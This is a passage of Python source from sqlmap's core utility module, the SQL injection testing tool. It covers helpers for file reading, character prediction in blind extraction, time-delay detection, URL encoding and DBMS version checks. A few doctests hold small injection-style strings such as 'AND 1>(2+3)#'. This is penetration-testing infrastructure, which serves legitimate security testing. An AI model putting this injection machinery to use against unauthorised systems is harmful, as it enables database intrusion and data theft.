\"information_schema\" in kb.commonOutputs[\"Databases\"]\n    True\n    \"\"\"\n\n    kb.commonOutputs = {}\n    key = None\n\n    with openFile(paths.COMMON_OUTPUTS, 'r') as f:\n        for line in f:\n            if line.find('#') != -1:\n                line = line[:line.find('#')]\n\n            line = line.strip()\n\n            if len(line) > 1:\n                if line.startswith('[') and line.endswith(']'):\n                    key = line[1:-1]\n                elif key:\n                    if key not in kb.commonOutputs:\n                        kb.commonOutputs[key] = set()\n\n                    if line not in kb.commonOutputs[key]:\n                        kb.commonOutputs[key].add(line)\n\ndef getFileItems(filename, commentPrefix='#', unicoded=True, lowercase=False, unique=False):\n    \"\"\"\n    Returns newline delimited items contained inside file\n\n    >>> \"SELECT\" in getFileItems(paths.SQL_KEYWORDS)\n    True\n    \"\"\"\n\n    retVal = list() if not unique else OrderedDict()\n\n    if filename:\n        filename = filename.strip('\"\\'')\n\n    checkFile(filename)\n\n    try:\n        with openFile(filename, 'r', errors=\"ignore\") if unicoded else open(filename, 'r') as f:\n            for line in f:\n                if commentPrefix:\n                    if line.find(commentPrefix) != -1:\n                        line = line[:line.find(commentPrefix)]\n\n                line = line.strip()\n\n                if line:\n                    if lowercase:\n                        line = line.lower()\n\n                    if unique and line in retVal:\n                        continue\n\n                    if unique:\n                        retVal[line] = True\n                    else:\n                        retVal.append(line)\n    except (IOError, OSError, MemoryError) as ex:\n        errMsg = \"something went wrong while trying \"\n        errMsg += \"to read the content of file '%s' ('%s')\" % (filename, getSafeExString(ex))\n        raise SqlmapSystemException(errMsg)\n\n    return retVal if not unique else list(retVal.keys())\n\ndef goGoodSamaritan(prevValue, originalCharset):\n    \"\"\"\n    Function for retrieving parameters needed for common prediction (good\n    samaritan) feature.\n\n    prevValue: retrieved query output so far (e.g. 'i').\n\n    Returns commonValue if there is a complete single match (in kb.partRun\n    of txt/common-outputs.txt under kb.partRun) regarding parameter\n    prevValue. If there is no single value match, but multiple, commonCharset is\n    returned containing more probable characters (retrieved from matched\n    values in txt/common-outputs.txt) together with the rest of charset as\n    otherCharset.\n    \"\"\"\n\n    if kb.commonOutputs is None:\n        initCommonOutputs()\n\n    predictionSet = set()\n    commonValue = None\n    commonPattern = None\n    countCommonValue = 0\n\n    # If the header (e.g. Databases) we are looking for has common\n    # outputs defined\n    if kb.partRun in kb.commonOutputs:\n        commonPartOutputs = kb.commonOutputs[kb.partRun]\n        commonPattern = commonFinderOnly(prevValue, commonPartOutputs)\n\n        # If the longest common prefix is the same as previous value then\n        # do not consider it\n        if commonPattern and commonPattern == prevValue:\n            commonPattern = None\n\n        # For each common output\n        for item in commonPartOutputs:\n            # Check if the common output (item) starts with prevValue\n            # where prevValue is the enumerated character(s) so far\n            if item.startswith(prevValue):\n                commonValue = item\n                countCommonValue += 1\n\n                if len(item) > len(prevValue):\n                    char = item[len(prevValue)]\n                    predictionSet.add(char)\n\n        # Reset single value if there is more than one possible common\n        # output\n        if countCommonValue > 1:\n            commonValue = None\n\n        commonCharset = []\n        otherCharset = []\n\n        # Split the original charset into common chars (commonCharset)\n        # and other chars (otherCharset)\n        for ordChar in originalCharset:\n            if _unichr(ordChar) not in predictionSet:\n                otherCharset.append(ordChar)\n            else:\n                commonCharset.append(ordChar)\n\n        commonCharset.sort()\n\n        return commonValue, commonPattern, commonCharset, originalCharset\n    else:\n        return None, None, None, originalCharset\n\ndef getPartRun(alias=True):\n    \"\"\"\n    Goes through call stack and finds constructs matching\n    conf.dbmsHandler.*. Returns it or its alias used in 'txt/common-outputs.txt'\n    \"\"\"\n\n    retVal = None\n    commonPartsDict = optDict[\"Enumeration\"]\n\n    try:\n        stack = [item[4][0] if isinstance(item[4], list) else '' for item in inspect.stack()]\n\n        # Goes backwards through the stack to find the conf.dbmsHandler method\n        # calling this function\n        for i in xrange(0, len(stack) - 1):\n            for regex in (r\"self\\.(get[^(]+)\\(\\)\", r\"conf\\.dbmsHandler\\.([^(]+)\\(\\)\"):\n                match = re.search(regex, stack[i])\n\n                if match:\n                    # This is the calling conf.dbmsHandler or self method\n                    # (e.g. 'getDbms')\n                    retVal = match.groups()[0]\n                    break\n\n            if retVal is not None:\n                break\n\n    # Reference: http://coding.derkeiler.com/Archive/Python/comp.lang.python/2004-06/2267.html\n    except TypeError:\n        pass\n\n    # Return the INI tag to consider for common outputs (e.g. 'Databases')\n    if alias:\n        return commonPartsDict[retVal][1] if isinstance(commonPartsDict.get(retVal), tuple) else retVal\n    else:\n        return retVal\n\ndef longestCommonPrefix(*sequences):\n    \"\"\"\n    Returns longest common prefix occuring in given sequences\n\n    # Reference: http://boredzo.org/blog/archives/2007-01-06/longest-common-prefix-in-python-2\n\n    >>> longestCommonPrefix('foobar', 'fobar')\n    'fo'\n    \"\"\"\n\n    if len(sequences) == 1:\n        return sequences[0]\n\n    sequences = [pair[1] for pair in sorted((len(fi), fi) for fi in sequences)]\n\n    if not sequences:\n        return None\n\n    for i, comparison_ch in enumerate(sequences[0]):\n        for fi in sequences[1:]:\n            ch = fi[i]\n\n            if ch != comparison_ch:\n                return fi[:i]\n\n    return sequences[0]\n\ndef commonFinderOnly(initial, sequence):\n    \"\"\"\n    Returns parts of sequence which start with the given initial string\n\n    >>> commonFinderOnly(\"abcd\", [\"abcdefg\", \"foobar\", \"abcde\"])\n    'abcde'\n    \"\"\"\n\n    return longestCommonPrefix(*[_ for _ in sequence if _.startswith(initial)])\n\ndef pushValue(value):\n    \"\"\"\n    Push value to the stack (thread dependent)\n    \"\"\"\n\n    exception = None\n    success = False\n\n    for i in xrange(PUSH_VALUE_EXCEPTION_RETRY_COUNT):\n        try:\n            getCurrentThreadData().valueStack.append(copy.deepcopy(value))\n            success = True\n            break\n        except Exception as ex:\n            exception = ex\n\n    if not success:\n        getCurrentThreadData().valueStack.append(None)\n\n        if exception:\n            raise exception\n\ndef popValue():\n    \"\"\"\n    Pop value from the stack (thread dependent)\n\n    >>> pushValue('foobar')\n    >>> popValue()\n    'foobar'\n    \"\"\"\n\n    retVal = None\n\n    try:\n        retVal = getCurrentThreadData().valueStack.pop()\n    except IndexError:\n        pass\n\n    return retVal\n\ndef wasLastResponseDBMSError():\n    \"\"\"\n    Returns True if the last web request resulted in a (recognized) DBMS error page\n    \"\"\"\n\n    threadData = getCurrentThreadData()\n    return threadData.lastErrorPage and threadData.lastErrorPage[0] == threadData.lastRequestUID\n\ndef wasLastResponseHTTPError():\n    \"\"\"\n    Returns True if the last web request resulted in an erroneous HTTP code (like 500)\n    \"\"\"\n\n    threadData = getCurrentThreadData()\n    return threadData.lastHTTPError and threadData.lastHTTPError[0] == threadData.lastRequestUID\n\ndef wasLastResponseDelayed():\n    \"\"\"\n    Returns True if the last web request resulted in a time-delay\n    \"\"\"\n\n    # 99.9999999997440% of all non time-based SQL injection affected\n    # response times should be inside +-7*stdev([normal response times])\n    # Math reference: http://www.answers.com/topic/standard-deviation\n\n    deviation = stdev(kb.responseTimes.get(kb.responseTimeMode, []))\n    threadData = getCurrentThreadData()\n\n    if deviation and not conf.direct and not conf.disableStats:\n        if len(kb.responseTimes[kb.responseTimeMode]) < MIN_TIME_RESPONSES:\n            warnMsg = \"time-based standard deviation method used on a model \"\n            warnMsg += \"with less than %d response times\" % MIN_TIME_RESPONSES\n            logger.warning(warnMsg)\n\n        lowerStdLimit = average(kb.responseTimes[kb.responseTimeMode]) + TIME_STDEV_COEFF * deviation\n        retVal = (threadData.lastQueryDuration >= max(MIN_VALID_DELAYED_RESPONSE, lowerStdLimit))\n\n        if not kb.testMode and retVal:\n            if kb.adjustTimeDelay is None:\n                msg = \"do you want sqlmap to try to optimize value(s) \"\n                msg += \"for DBMS delay responses (option '--time-sec')? [Y/n] \"\n\n                kb.adjustTimeDelay = ADJUST_TIME_DELAY.DISABLE if not readInput(msg, default='Y', boolean=True) else ADJUST_TIME_DELAY.YES\n            if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:\n                adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit)\n\n        return retVal\n    else:\n        delta = threadData.lastQueryDuration - conf.timeSec\n        if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):  # MySQL's SLEEP(X) lasts 0.05 seconds shorter on average\n            delta += 0.05\n        return delta >= 0\n\ndef adjustTimeDelay(lastQueryDuration, lowerStdLimit):\n    \"\"\"\n    Provides tip for adjusting time delay in time-based data retrieval\n    \"\"\"\n\n    candidate = (1 if not isHeavyQueryBased() else 2) + int(round(lowerStdLimit))\n\n    kb.delayCandidates = [candidate] + kb.delayCandidates[:-1]\n\n    if all((_ == candidate for _ in kb.delayCandidates)) and candidate < conf.timeSec:\n        if lastQueryDuration / (1.0 * conf.timeSec / candidate) > MIN_VALID_DELAYED_RESPONSE:  # Note: to prevent problems with fast responses for heavy-queries like RANDOMBLOB\n            conf.timeSec = candidate\n\n            infoMsg = \"adjusting time delay to \"\n            infoMsg += \"%d second%s due to good response times\" % (conf.timeSec, 's' if conf.timeSec > 1 else '')\n            logger.info(infoMsg)\n\ndef getLastRequestHTTPError():\n    \"\"\"\n    Returns last HTTP error code\n    \"\"\"\n\n    threadData = getCurrentThreadData()\n    return threadData.lastHTTPError[1] if threadData.lastHTTPError else None\n\ndef extractErrorMessage(page):\n    \"\"\"\n    Returns reported error message from page if it founds one\n\n    >>> getText(extractErrorMessage(u'<html><title>Test</title>\\\\n<b>Warning</b>: oci_parse() [function.oci-parse]: ORA-01756: quoted string not properly terminated<br><p>Only a test page</p></html>') )\n    'oci_parse() [function.oci-parse]: ORA-01756: quoted string not properly terminated'\n    >>> extractErrorMessage('Warning: This is only a dummy foobar test') is None\n    True\n    \"\"\"\n\n    retVal = None\n\n    if isinstance(page, six.string_types):\n        if wasLastResponseDBMSError():\n            page = re.sub(r\"<[^>]+>\", \"\", page)\n\n        for regex in ERROR_PARSING_REGEXES:\n            match = re.search(regex, page, re.IGNORECASE)\n\n            if match:\n                candidate = htmlUnescape(match.group(\"result\")).replace(\"<br>\", \"\\n\").strip()\n                if candidate and (1.0 * len(re.findall(r\"[^A-Za-z,. ]\", candidate)) / len(candidate) > MIN_ERROR_PARSING_NON_WRITING_RATIO):\n                    retVal = candidate\n                    break\n\n        if not retVal and wasLastResponseDBMSError():\n            match = re.search(r\"[^\\n]*SQL[^\\n:]*:[^\\n]*\", page, re.IGNORECASE)\n\n            if match:\n                retVal = match.group(0)\n\n    return retVal\n\ndef findLocalPort(ports):\n    \"\"\"\n    Find the first opened localhost port from a given list of ports (e.g. for Tor port checks)\n    \"\"\"\n\n    retVal = None\n\n    for port in ports:\n        try:\n            try:\n                s = socket._orig_socket(socket.AF_INET, socket.SOCK_STREAM)\n            except AttributeError:\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((LOCALHOST, port))\n            retVal = port\n            break\n        except socket.error:\n            pass\n        finally:\n            try:\n                s.close()\n            except socket.error:\n                pass\n\n    return retVal\n\ndef findMultipartPostBoundary(post):\n    \"\"\"\n    Finds value for a boundary parameter in given multipart POST body\n\n    >>> findMultipartPostBoundary(\"-----------------------------9051914041544843365972754266\\\\nContent-Disposition: form-data; name=text\\\\n\\\\ndefault\")\n    '9051914041544843365972754266'\n    \"\"\"\n\n    retVal = None\n\n    done = set()\n    candidates = []\n\n    for match in re.finditer(r\"(?m)^--(.+?)(--)?$\", post or \"\"):\n        _ = match.group(1).strip().strip('-')\n\n        if _ in done:\n            continue\n        else:\n            candidates.append((post.count(_), _))\n            done.add(_)\n\n    if candidates:\n        candidates.sort(key=lambda _: _[0], reverse=True)\n        retVal = candidates[0][1]\n\n    return retVal\n\ndef urldecode(value, encoding=None, unsafe=\"%%?&=;+%s\" % CUSTOM_INJECTION_MARK_CHAR, convall=False, spaceplus=True):\n    \"\"\"\n    URL decodes given value\n\n    >>> urldecode('AND%201%3E%282%2B3%29%23', convall=True) == 'AND 1>(2+3)#'\n    True\n    >>> urldecode('AND%201%3E%282%2B3%29%23', convall=False) == 'AND 1>(2%2B3)#'\n    True\n    >>> urldecode(b'AND%201%3E%282%2B3%29%23', convall=False) == 'AND 1>(2%2B3)#'\n    True\n    \"\"\"\n\n    result = value\n\n    if value:\n        value = getUnicode(value)\n\n        if convall:\n            result = _urllib.parse.unquote_plus(value) if spaceplus else _urllib.parse.unquote(value)\n        else:\n            result = value\n            charset = set(string.printable) - set(unsafe)\n\n            def _(match):\n                char = decodeHex(match.group(1), binary=False)\n                return char if char in charset else match.group(0)\n\n            if spaceplus:\n                result = result.replace('+', ' ')  # plus sign has a special meaning in URL encoded data (hence the usage of _urllib.parse.unquote_plus in convall case)\n\n            result = re.sub(r\"%([0-9a-fA-F]{2})\", _, result or \"\")\n\n        result = getUnicode(result, encoding or UNICODE_ENCODING)\n\n    return result\n\ndef urlencode(value, safe=\"%&=-_\", convall=False, limit=False, spaceplus=False):\n    \"\"\"\n    URL encodes given value\n\n    >>> urlencode('AND 1>(2+3)#')\n    'AND%201%3E%282%2B3%29%23'\n    >>> urlencode(\"AND COUNT(SELECT name FROM users WHERE name LIKE '%DBA%')>0\")\n    'AND%20COUNT%28SELECT%20name%20FROM%20users%20WHERE%20name%20LIKE%20%27%25DBA%25%27%29%3E0'\n    >>> urlencode(\"AND COUNT(SELECT name FROM users WHERE name LIKE '%_SYSTEM%')>0\")\n    'AND%20COUNT%28SELECT%20name%20FROM%20users%20WHERE%20name%20LIKE%20%27%25_SYSTEM%25%27%29%3E0'\n    >>> urlencode(\"SELECT NAME FROM TABLE WHERE VALUE LIKE '%SOME%BEGIN%'\")\n    'SELECT%20NAME%20FROM%20TABLE%20WHERE%20VALUE%20LIKE%20%27%25SOME%25BEGIN%25%27'\n    \"\"\"\n\n    if conf.get(\"direct\"):\n        return value\n\n    count = 0\n    result = None if value is None else \"\"\n\n    if value:\n        value = re.sub(r\"\\b[$\\w]+=\", lambda match: match.group(0).replace('$', DOLLAR_MARKER), value)\n\n        if Backend.isDbms(DBMS.MSSQL) and not kb.tamperFunctions and any(ord(_) > 255 for _ in value):\n            warnMsg = \"if you experience problems with \"\n            warnMsg += \"non-ASCII identifier names \"\n            warnMsg += \"you are advised to rerun with '--tamper=charunicodeencode'\"\n            singleTimeWarnMessage(warnMsg)\n\n        if convall or safe is None:\n            safe = \"\"\n\n        # corner case when character % really needs to be\n        # encoded (when not representing URL encoded char)\n        # except in cases when tampering scripts are used\n        if all('%' in _ for _ in (safe, value)) and not kb.tamperFunctions:\n            value = re.sub(r\"(?i)\\bLIKE\\s+'[^']+'\", lambda match: match.group(0).replace('%', \"%25\"), value)\n            value = re.sub(r\"%(?![0-9a-fA-F]{2})\", \"%25\", value)\n\n        while True:\n            result = _urllib.parse.quote(getBytes(value), safe)\n\n            if limit and len(result) > URLENCODE_CHAR_LIMIT:\n                if count >= len(URLENCODE_FAILSAFE_CHARS):\n                    break\n\n                while count < len(URLENCODE_FAILSAFE_CHARS):\n                    safe += URLENCODE_FAILSAFE_CHARS[count]\n                    count += 1\n                    if safe[-1] in value:\n                        break\n            else:\n                break\n\n        if spaceplus:\n            result = result.replace(_urllib.parse.quote(' '), '+')\n\n        result = result.replace(DOLLAR_MARKER, '$')\n\n    return result\n\ndef runningAsAdmin():\n    \"\"\"\n    Returns True if the current process is run under admin privileges\n    \"\"\"\n\n    isAdmin = None\n\n    if PLATFORM in (\"posix\", \"mac\"):\n        _ = os.geteuid()\n\n        isAdmin = isinstance(_, (float, six.integer_types)) and _ == 0\n    elif IS_WIN:\n        import ctypes\n\n        _ = ctypes.windll.shell32.IsUserAnAdmin()\n\n        isAdmin = isinstance(_, (float, six.integer_types)) and _ == 1\n    else:\n        errMsg = \"sqlmap is not able to check if you are running it \"\n        errMsg += \"as an administrator account on this platform. \"\n        errMsg += \"sqlmap will assume that you are an administrator \"\n        errMsg += \"which is mandatory for the requested takeover attack \"\n        errMsg += \"to work properly\"\n        logger.error(errMsg)\n\n        isAdmin = True\n\n    return isAdmin\n\ndef logHTTPTraffic(requestLogMsg, responseLogMsg, startTime=None, endTime=None):\n    \"\"\"\n    Logs HTTP traffic to the output file\n    \"\"\"\n\n    if conf.harFile:\n        conf.httpCollector.collectRequest(requestLogMsg, responseLogMsg, startTime, endTime)\n\n    if conf.trafficFile:\n        with kb.locks.log:\n            dataToTrafficFile(\"%s%s\" % (requestLogMsg, os.linesep))\n            dataToTrafficFile(\"%s%s\" % (responseLogMsg, os.linesep))\n            dataToTrafficFile(\"%s%s%s%s\" % (os.linesep, 76 * '#', os.linesep, os.linesep))\n\ndef getPageTemplate(payload, place):  # Cross-referenced function\n    raise NotImplementedError\n\n@cachedmethod\ndef getPublicTypeMembers(type_, onlyValues=False):\n    \"\"\"\n    Useful for getting members from types (e.g. in enums)\n\n    >>> [_ for _ in getPublicTypeMembers(OS, True)]\n    ['Linux', 'Windows']\n    >>> [_ for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True)]\n    [1, 2, 3, 4, 5, 6]\n    \"\"\"\n\n    retVal = []\n\n    for name, value in inspect.getmembers(type_):\n        if not name.startswith(\"__\"):\n            if not onlyValues:\n                retVal.append((name, value))\n            else:\n                retVal.append(value)\n\n    return retVal\n\ndef enumValueToNameLookup(type_, value_):\n    \"\"\"\n    Returns name of a enum member with a given value\n\n    >>> enumValueToNameLookup(SORT_ORDER, 100)\n    'LAST'\n    \"\"\"\n\n    retVal = None\n\n    for name, value in getPublicTypeMembers(type_):\n        if value == value_:\n            retVal = name\n            break\n\n    return retVal\n\n@cachedmethod\ndef extractRegexResult(regex, content, flags=0):\n    \"\"\"\n    Returns 'result' group value from a possible match with regex on a given\n    content\n\n    >>> extractRegexResult(r'a(?P<result>[^g]+)g', 'abcdefg')\n    'bcdef'\n    >>> extractRegexResult(r'a(?P<result>[^g]+)g', 'ABCDEFG', re.I)\n    'BCDEF'\n    \"\"\"\n\n    retVal = None\n\n    if regex and content and \"?P<result>\" in regex:\n        if isinstance(content, six.binary_type) and isinstance(regex, six.text_type):\n            regex = getBytes(regex)\n\n        match = re.search(regex, content, flags)\n\n        if match:\n            retVal = match.group(\"result\")\n\n    return retVal\n\ndef extractTextTagContent(page):\n    \"\"\"\n    Returns list containing content from \"textual\" tags\n\n    >>> extractTextTagContent('<html><head><title>Title</title></head><body><pre>foobar</pre><a href=\"#link\">Link</a></body></html>')\n    ['Title', 'foobar']\n    \"\"\"\n\n    page = page or \"\"\n\n    if REFLECTED_VALUE_MARKER in page:\n        try:\n            page = re.sub(r\"(?i)[^\\s>]*%s[^\\s<]*\" % REFLECTED_VALUE_MARKER, \"\", page)\n        except MemoryError:\n            page = page.replace(REFLECTED_VALUE_MARKER, \"\")\n\n    return filterNone(_.group(\"result\").strip() for _ in re.finditer(TEXT_TAG_REGEX, page))\n\ndef trimAlphaNum(value):\n    \"\"\"\n    Trims alpha numeric characters from start and ending of a given value\n\n    >>> trimAlphaNum('AND 1>(2+3)-- foobar')\n    ' 1>(2+3)-- '\n    \"\"\"\n\n    while value and value[-1].isalnum():\n        value = value[:-1]\n\n    while value and value[0].isalnum():\n        value = value[1:]\n\n    return value\n\ndef isNumPosStrValue(value):\n    \"\"\"\n    Returns True if value is a string (or integer) with a positive integer representation\n\n    >>> isNumPosStrValue(1)\n    True\n    >>> isNumPosStrValue('1')\n    True\n    >>> isNumPosStrValue(0)\n    False\n    >>> isNumPosStrValue('-2')\n    False\n    >>> isNumPosStrValue('100000000000000000000')\n    False\n    \"\"\"\n\n    retVal = False\n\n    try:\n        retVal = ((hasattr(value, \"isdigit\") and value.isdigit() and int(value) > 0) or (isinstance(value, int) and value > 0)) and int(value) < MAX_INT\n    except ValueError:\n        pass\n\n    return retVal\n\n@cachedmethod\ndef aliasToDbmsEnum(dbms):\n    \"\"\"\n    Returns major DBMS name from a given alias\n\n    >>> aliasToDbmsEnum('mssql')\n    'Microsoft SQL Server'\n    \"\"\"\n\n    retVal = None\n\n    if dbms:\n        for key, item in DBMS_DICT.items():\n            if dbms.lower() in item[0] or dbms.lower() == key.lower():\n                retVal = key\n                break\n\n    return retVal\n\ndef findDynamicContent(firstPage, secondPage):\n    \"\"\"\n    This function checks if the provided pages have dynamic content. If they\n    are dynamic, proper markings will be made\n\n    >>> findDynamicContent(\"Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.\", \"Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. <script src='ads.js'></script>Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.\")\n    >>> kb.dynamicMarkings\n    [('natum reque et per. ', 'Facer tritani repreh')]\n    \"\"\"\n\n    if not firstPage or not secondPage:\n        return\n\n    infoMsg = \"searching for dynamic content\"\n    singleTimeLogMessage(infoMsg)\n\n    blocks = list(SequenceMatcher(None, firstPage, secondPage).get_matching_blocks())\n    kb.dynamicMarkings = []\n\n    # Removing too small matching blocks\n    for block in blocks[:]:\n        (_, _, length) = block\n\n        if length <= 2 * DYNAMICITY_BOUNDARY_LENGTH:\n            blocks.remove(block)\n\n    # Making of dynamic markings based on prefix/suffix principle\n    if len(blocks) > 0:\n        blocks.insert(0, None)\n        blocks.append(None)\n\n        for i in xrange(len(blocks) - 1):\n            prefix = firstPage[blocks[i][0]:blocks[i][0] + blocks[i][2]] if blocks[i] else None\n            suffix = firstPage[blocks[i + 1][0]:blocks[i + 1][0] + blocks[i + 1][2]] if blocks[i + 1] else None\n\n            if prefix is None and blocks[i + 1][0] == 0:\n                continue\n\n            if suffix is None and (blocks[i][0] + blocks[i][2] >= len(firstPage)):\n                continue\n\n            if prefix and suffix:\n                prefix = prefix[-DYNAMICITY_BOUNDARY_LENGTH:]\n                suffix = suffix[:DYNAMICITY_BOUNDARY_LENGTH]\n\n                for _ in (firstPage, secondPage):\n                    match = re.search(r\"(?s)%s(.+)%s\" % (re.escape(prefix), re.escape(suffix)), _)\n                    if match:\n                        infix = match.group(1)\n                        if infix[0].isalnum():\n                            prefix = trimAlphaNum(prefix)\n                        if infix[-1].isalnum():\n                            suffix = trimAlphaNum(suffix)\n                        break\n\n            kb.dynamicMarkings.append((prefix if prefix else None, suffix if suffix else None))\n\n    if len(kb.dynamicMarkings) > 0:\n        infoMsg = \"dynamic content marked for removal (%d region%s)\" % (len(kb.dynamicMarkings), 's' if len(kb.dynamicMarkings) > 1 else '')\n        singleTimeLogMessage(infoMsg)\n\ndef removeDynamicContent(page):\n    \"\"\"\n    Removing dynamic content from supplied page basing removal on\n    precalculated dynamic markings\n    \"\"\"\n\n    if page:\n        for item in kb.dynamicMarkings:\n            prefix, suffix = item\n\n            if prefix is None and suffix is None:\n                continue\n            elif prefix is None:\n                page = re.sub(r\"(?s)^.+%s\" % re.escape(suffix), suffix.replace('\\\\', r'\\\\'), page)\n            elif suffix is None:\n                page = re.sub(r\"(?s)%s.+$\" % re.escape(prefix), prefix.replace('\\\\', r'\\\\'), page)\n            else:\n                page = re.sub(r\"(?s)%s.+%s\" % (re.escape(prefix), re.escape(suffix)), \"%s%s\" % (prefix.replace('\\\\', r'\\\\'), suffix.replace('\\\\', r'\\\\')), page)\n\n    return page\n\ndef filterStringValue(value, charRegex, replacement=\"\"):\n    \"\"\"\n    Returns string value consisting only of chars satisfying supplied\n    regular expression (note: it has to be in form [...])\n\n    >>> filterStringValue('wzydeadbeef0123#', r'[0-9a-f]')\n    'deadbeef0123'\n    \"\"\"\n\n    retVal = value\n\n    if value:\n        retVal = re.sub(charRegex.replace(\"[\", \"[^\") if \"[^\" not in charRegex else charRegex.replace(\"[^\", \"[\"), replacement, value)\n\n    return retVal\n\ndef filterControlChars(value, replacement=' '):\n    \"\"\"\n    Returns string value with control chars being supstituted with replacement character\n\n    >>> filterControlChars('AND 1>(2+3)\\\\n--')\n    'AND 1>(2+3) --'\n    \"\"\"\n\n    return filterStringValue(value, PRINTABLE_CHAR_REGEX, replacement)\n\ndef filterNone(values):\n    \"\"\"\n    Emulates filterNone([...]) functionality\n\n    >>> filterNone([1, 2, \"\", None, 3])\n    [1, 2, 3]\n    \"\"\"\n\n    retVal = values\n\n    if isinstance(values, _collections.Iterable):\n        retVal = [_ for _ in values if _]\n\n    return retVal\n\ndef isDBMSVersionAtLeast(minimum):\n    \"\"\"\n    Checks if the recognized DBMS version is at least the version specified\n\n    >>> pushValue(kb.dbmsVersion)\n    >>> kb.dbmsVersion = \"2\"\n    >>> isDBMSVersionAtLeast(\"1.3.4.1.4\")\n    True\n    >>> isDBMSVersionAtLeast(2.1)\n    False\n    >>> isDBMSVersionAtLeast(\">2\")\n    False\n    >>> isDBMSVersionAtLeast(\">=2.0\")\n    True\n    >>> kb.dbmsVersion = \"<2\"\n    >>> isDBMSVersionAtLeast(\"2\")\n    False\n    >>> isDBMSVersionAtLeast(\"1.5\")\n    True\n    >>> kb.dbmsVersion = \"MySQL 5.4.3-log4\"\n    >>> isDBMSVersionAtLeast(\"5\")\n    True\n    >>> kb.dbmsVersion = popValue()\n    \"\"\"\n\n    retVal = None\n\n    if not any(isNoneValue(_) for _ in (Backend.getVersion(), minimum)) and Backend.getVersion() != UNKNOWN_DBMS_VERSION:\n        version = Backend.getVersion().replace(\" \", \"\").rstrip('.')\n\n        correction = 0.0\n        if \">=\" in version:\n            pass\n        elif '>' in version:\n            correction = VERSION_COMPARISON_CORRECTION\n        elif '<' in version:\n            correction = -VERSION_COMPARISON_CORRECTION\n\n        version = extractRegexResult(r\"(?P<result>[0-9][0-9.]*)\", version)\n\n        if version:\n            if '.' in version:\n                parts = version.split('.', 1)\n                parts[1] = filterStringValue(parts[1], '[0-9]')\n                version = '.'.join(parts)\n\n            try:\n                version = float(filterStringValue(version, '[0-9.]')) + correction\n            except ValueError:\n                return None\n\n            if isinstance(minimum, six.string_types):\n                if '.' in minimum:\n                    parts = minimum.split('.', 1)\n                    parts[1] = filterStringValue(parts[1], '[0-9]')\n                    minimum = '.'.join(parts)\n\n                correction = 0.0\n                if minimum.startswith(\">=\"):\n                    pass\n                elif minimum.startswith(\">\"):\n                    correction = VERSION_COMPARISON_CORRECTION\n\n                minimum = float(filterStringValue(minimum, '[0-9.]')) + correction\n\n            retVal = version >= minimum\n\n    return retVal\n\ndef parseSqliteTableSchema(value):\n    \"\"\"\n    Parses table column names and types from specified SQLite table schema\n\n    >>> kb.data.cachedColumns = {}\n    >>> parseSqliteTableSchema(\"CREATE TABLE users(\\\\n\\\\t\\\\tid INTEGER,\\\\n\\\\t\\\\tname TEXT\\\\n);\")\n    True\n    >>> tuple(kb.data.cachedColumns[conf.db][conf.tbl].items()) == (('id', 'INTEGER'), ('name', 'TEXT'))\n    True\n    >>> parseSqliteTableSchema(\"CREATE TABLE dummy(`foo bar` BIGINT, \\\\\"foo\\\\\" VARCHAR, 'bar' TEXT)\");\n    True\n    >>> tuple(kb.data.cachedColumns[conf.db][conf.tbl].items()) == (('foo bar', 'BIGINT'), ('foo', 'VARCHAR'), ('bar', 'TEXT'))\n    True\n    >>> parseSqliteTableSchema(\"CREATE TABLE suppliers(\\\\n\\\\tsupplier_id INTEGER PRIMARY KEY DESC,\\\\n\\\\tname TEXT NOT NULL\\\\n);\");\n    True\n    >>> tuple(kb.data.cachedColumns[conf.db][conf.tbl].items()) == (('supplier_id', 'INTEGER'), ('name', 'TEXT'))\n    True\n    >>> parseSqliteTableSchema(\"CREATE TABLE country_languages (\\\\n\\\\tcountry_id INTEGER NOT NULL,\\\\n\\\\tlanguage_id INTEGER NOT NULL,\\\\n\\\\tPRIMARY KEY (country_id, language_id),\\\\n\\\\tFOREIGN KEY (country_id) REFERENCES countries (country_id) ON DELETE CASCADE ON UPDATE NO ACTION,\\\\tFOREIGN KEY (language_id) REFERENCES languages (language_id) ON DELETE CASCADE ON UPDATE NO ACTION);\");\n    True\n    >>> tuple(kb.data.cachedColumns[conf.db][conf.tbl].items()) == (('country_id', 'INTEGER'), ('language_id', 'INTEGER'))\n    True\n    \"\"\"\n\n    retVal = False\n\n    value = extractRegexResult(r\"(?s)\\((?P<result>.+)\\)\", value)\n\n    if value:\n        table = {}\n        columns = OrderedDict()\n\n        value = re.sub(r\"\\(.+?\\)\", \"\", value).strip()\n\n        for match in re.finditer(r\"(?:\\A|,)\\s*(([\\\"'`]).+?\\2|\\w+)(?:\\s+(INT|INTEGER|TINYINT|SMALLINT|MEDIUMINT|BIGINT|UNSIGNED BIG INT|INT2|INT8|INTEGER|CHARACTER|VARCHAR|VARYING CHARACTER|NCHAR|NATIVE CHARACTER|NVARCHAR|TEXT|CLOB|LONGTEXT|BLOB|NONE|REAL|DOUBLE|DOUBLE PRECISION|FLOAT|REAL|NUMERIC|DECIMAL|BOOLEAN|DATE|DATETIME|NUMERIC)\\b)?\", decodeStringEscape(value), re.I):\n            column = match.group(1).strip(match.group(2) or \"\")\n            if re.search(r\"(?i)\\A(CONSTRAINT|PRIMARY|UNIQUE|CHECK|FOREIGN)\\b\", column.strip()):\n                continue\n            retVal = True\n\n            columns[column] = match.group(3) or \"TEXT\"\n\n        table[safeSQLIdentificatorNaming(conf.tbl, True)] = columns\n        kb.data.cachedColumns[conf.db] = table\n\n    return retVal\n\ndef getTechniqueData(technique=None):\n    \"\"\"\n    Returns injection data for technique specified\n    \"\"\"\n\n    return kb.injection.data.get(technique if technique is not None else getTechnique())\n\ndef isTechniqueAvailable(technique):\n    \"\"\"\n    Returns True if there is injection data which sqlmap could use for technique specified\n\n    >>> pushValue(kb.injection.data)\n    >>> kb.injection.data[PAYLOAD.TECHNIQUE.ERROR] = [test for test in getSortedInjectionTests() if \"error\" in test[\"title\"].lower()][0]\n    >>> 